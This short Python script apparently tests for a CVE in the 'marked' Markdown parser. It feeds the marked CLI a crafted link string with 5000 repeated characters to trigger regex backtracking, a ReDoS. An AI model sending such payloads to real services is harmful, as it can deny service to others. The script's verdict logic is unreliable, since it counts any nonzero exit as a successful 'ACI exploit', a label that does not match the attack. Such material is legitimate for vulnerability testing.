import time
import subprocess

def test_cve_exploit():
    # Crafted input that triggers catastrophic backtracking
    crafted_input = "[Test](url" + "A" * 5000 + ")"

    # Start the marked process with the crafted input
    start_time = time.time()
    process = subprocess.Popen(['marked', crafted_input], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Allow the process some time to complete
    try:
        process.wait(timeout=10)  # 10 seconds timeout
        output, error = process.communicate()
        if process.returncode == 0:
            print("The ACI exploit failed!!!")
        else:
            print("The ACI exploit success!!!")
    except subprocess.TimeoutExpired:
        print("The ACI exploit success!!!")
        process.kill()

if __name__ == "__main__":
    test_cve_exploit()
